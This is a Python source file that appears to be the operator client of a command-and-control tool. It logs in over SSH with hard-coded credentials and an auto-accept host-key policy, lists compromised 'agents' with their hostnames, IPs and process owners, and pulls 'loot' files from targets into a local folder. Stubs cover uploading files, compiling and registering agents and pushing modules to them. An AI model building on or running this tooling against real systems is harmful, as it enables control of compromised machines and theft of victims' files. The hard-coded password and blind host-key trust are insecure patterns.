import paramiko
import misc

class AgentStruct():
    def __init__(self, id, ip, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.ip = ip
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # To read from channel:
        #   recv(self, nbytes)
        # To write to channel:
        #   sendall(self, s)

        # Initiate the connection
        self.channel.sendall("0")
        out = self.channel.recv(5)
        print(out)
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.channel.recv(8196).decode()
            if out != "fi":
                out = out.split("\n")
                appnd = AgentStruct(out[0],out[1],out[2],out[3],out[4],out[5])
                self.agents.append(appnd)
                self.channel.sendall('0')

        print("[+] Successfully gathered agent information")

    def upload_file(self, file, target):
        self.channel.sendall("22|" + file.filename)

    def download_loot(self, target):
        self.channel.sendall("21|"+target)
        num = int(self.channel.recv(10))
        for i in range(num):
            self.channel.sendall("rd")
            name = self.channel.recv(256)
            self.channel.sendall("ok")
            size = int(self.channel.recv(10))
            self.channel.sendall("ok")
            data = self.channel.recv(size)

            file = open("loot/" + name, "wb")
            file.write(data)

        self.channel.sendall("cm")

    def compile_agent(self, ip, port):
        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))

        fileData = ""
        misc.save_file(fileData)

    def register_agent(self, name, password):
        print("[ ] Registering agent with server...")

    def do_download(self, agent_id, path):
        print("[ ] Doing Download...")

    def push_module(self, agent_id, filestruct):
        print("[ ] Pushing module file to agent %s..." % agent_id)


